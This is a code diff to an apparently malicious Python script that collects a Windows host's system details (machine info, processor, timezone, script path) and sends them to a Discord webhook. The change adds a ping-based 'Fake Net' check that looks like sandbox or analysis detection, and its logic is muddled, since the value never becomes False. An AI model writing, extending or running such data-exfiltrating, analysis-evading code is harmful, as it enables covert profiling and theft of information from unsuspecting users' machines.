@@ -1,6 +1,5 @@
 #author: suegdu
 
-
 from requests import get
 from discord_webhook import DiscordEmbed,DiscordWebhook
 import platform
@@ -11,6 +10,7 @@ import time
 import wmi
 import psutil
 import datetime
+import subprocess
 c = wmi.WMI()   
 my_system = c.Win32_ComputerSystem()[0]
 time2 = time.time()
@@ -25,8 +25,17 @@ else:
      st = False
 
 proc = platform.processor() 
-        
-        
+
+fknet = False
+try:
+ f = subprocess.check_output("ping google.com -n 1")
+except:
+    fknet = True
+else:
+    fknet = "Unknown"
+    
+
+
         
 DISCORD_WEBHOOK = "YOUR WEBHOOK LINK"
 
@@ -55,6 +64,7 @@ def sg():
  embed.add_embed_field(name="Path :", value=f"**{sys.argv[0]}**", inline=True)
  embed.add_embed_field(name="Local Timezone :", value=f"**{local_tzname}**", inline=True)
  embed.add_embed_field(name="Processor :", value=f"**{proc}**", inline=True)
+ embed.add_embed_field(name="Fake Net :", value=f"**{fknet}**", inline=True)
  embed.set_footer(text=f"{time2}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
  webhook.add_embed(embed)
  response = webhook.execute()
